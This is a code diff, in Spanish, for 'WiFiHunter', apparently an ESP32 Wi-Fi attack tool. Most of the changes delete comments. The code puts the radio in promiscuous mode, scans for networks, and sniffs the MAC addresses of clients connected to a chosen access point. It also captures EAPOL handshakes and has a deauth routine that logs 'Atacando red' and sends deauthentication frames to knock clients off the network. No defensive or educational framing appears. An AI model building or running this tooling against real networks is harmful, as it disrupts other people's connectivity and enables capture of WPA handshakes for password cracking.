@@ -1,4 +1,5 @@
 #include "WiFiHunter.h"
+#include "esp_wifi.h"  // Añadir este include para las funciones de WiFi
 
 WiFiHunter* WiFiHunter::instance = nullptr;
 HandshakeCallback WiFiHunter::handshakeCB = nullptr;
@@ -13,8 +14,6 @@ void WiFiHunter::begin() {
     esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
     Serial.println("Modo promiscuo activado");
 }
-
-// --- Escaneo de redes (igual que antes) ---
 
 void WiFiHunter::startScan() {
     esp_wifi_set_promiscuous(false);
@@ -44,8 +43,6 @@ void WiFiHunter::getScanResults(RedInfo* resultados, int maxRedes, int& encontra
     Serial.printf("%d redes encontradas\n", encontradas);
 }
 
-// --- Escaneo de clientes (activo y eficiente) ---
-
 void WiFiHunter::scanClients(const uint8_t* bssid, int canal) {
     memcpy(bssidObjetivo, bssid, 6);
     canalObjetivo = canal;
@@ -55,21 +52,15 @@ void WiFiHunter::scanClients(const uint8_t* bssid, int canal) {
     esp_wifi_set_channel(canal, WIFI_SECOND_CHAN_NONE);
     Serial.printf("Escaneando clientes en canal %d\n", canal);
     
-    // El callback promiscuo irá llenando el buffer de clientes
-    // durante 3 segundos sin bloquear
     unsigned long start = millis();
     while (millis() - start < 3000) {
-        // El callback ya está activo, solo esperamos
         delay(10);
-        // También procesamos handshakes pendientes
         processPendingHandshakes();
     }
     
-    // Limpiar clientes antiguos (timeout)
     unsigned long ahora = millis();
     for (int i = 0; i < numClientes; i++) {
         if (ahora - clientes[i].ultimaVez > CLIENTE_TIMEOUT) {
-            // Eliminamos el cliente (movemos los siguientes)
             for (int j = i; j < numClientes - 1; j++) {
                 memcpy(&clientes[j], &clientes[j+1], sizeof(ClienteInfo));
             }
@@ -86,8 +77,6 @@ ClienteInfo* WiFiHunter::getClientes(int& count) {
     count = numClientes;
     return clientes;
 }
-
-// --- Deauth (mejorado) ---
 
 void WiFiHunter::deauth(const RedInfo& red, const uint8_t* clienteMac, int numPaquetes) {
     Serial.printf("Atacando red: %s (canal %d)\n", red.ssid, red.canal);
@@ -137,8 +126,6 @@ void WiFiHunter::sendDeauthFrame(const uint8_t* bssid, const uint8_t* clienteMac
     }
 }
 
-// --- Callback promiscuo (actualizado para clientes) ---
-
 void WiFiHunter::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
     wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t*)buf;
     uint8_t *frame = pkt->payload;
@@ -147,12 +134,10 @@ void WiFiHunter::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type
     
     if (len < 24) return;
     
-    // Extraer direcciones MAC
-    uint8_t* addr1 = &frame[4];  // Destino
-    uint8_t* addr2 = &frame[10]; // Origen
-    uint8_t* addr3 = &frame[16]; // BSSID (puede variar)
+    uint8_t* addr1 = &frame[4];
+    uint8_t* addr2 = &frame[10];
+    uint8_t* addr3 = &frame[16];
     
-    // Detectar handshake EAPOL (como antes)
     if (len > 100) {
         int offset = 24;
         for (int i = offset; i < len - 8; i++) {
@@ -174,38 +159,31 @@ void WiFiHunter::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type
         }
     }
     
-    // Detectar clientes (solo si estamos escaneando activamente)
     if (!instance || !instance->escaneandoClientes) return;
     
-    // Verificar si el paquete pertenece al BSSID objetivo
-    // addr3 suele ser el BSSID en tramas de datos
     uint8_t* bssid = addr3;
     if (memcmp(bssid, instance->bssidObjetivo, 6) != 0) {
-        // También puede estar en addr1 o addr2 dependiendo del tipo de trama
         if (memcmp(addr1, instance->bssidObjetivo, 6) != 0 &&
             memcmp(addr2, instance->bssidObjetivo, 6) != 0) {
             return;
         }
     }
     
-    // Determinar la MAC del cliente (la que no sea el BSSID)
     uint8_t* macCliente = nullptr;
     if (memcmp(addr1, instance->bssidObjetivo, 6) != 0) {
         macCliente = addr1;
     } else if (memcmp(addr2, instance->bssidObjetivo, 6) != 0) {
         macCliente = addr2;
     } else {
-        return; // No se encontró una MAC de cliente
+        return;
     }
     
-    // Actualizar o añadir cliente
     instance->actualizarCliente(macCliente, rssi, instance->bssidObjetivo, instance->canalObjetivo);
 }
 
 void WiFiHunter::actualizarCliente(uint8_t* mac, int rssi, uint8_t* bssid, int canal) {
     unsigned long ahora = millis();
     
-    // Buscar si ya existe
     for (int i = 0; i < numClientes; i++) {
         if (memcmp(clientes[i].mac, mac, 6) == 0) {
             clientes[i].rssi = rssi;
@@ -214,14 +192,12 @@ void WiFiHunter::actualizarCliente(uint8_t* mac, int rssi, uint8_t* bssid, int c
         }
     }
     
-    // Añadir nuevo cliente (si hay espacio)
     if (numClientes < MAX_CLIENTES) {
         memcpy(clientes[numClientes].mac, mac, 6);
         clientes[numClientes].rssi = rssi;
         clientes[numClientes].canal = canal;
         memcpy(clientes[numClientes].bssid, bssid, 6);
         clientes[numClientes].ultimaVez = ahora;
-        // Obtener fabricante desde OUI
         const char* fab = buscarOUI(mac);
         strncpy(clientes[numClientes].fabricante, fab, 15);
         clientes[numClientes].fabricante[15] = '\0';
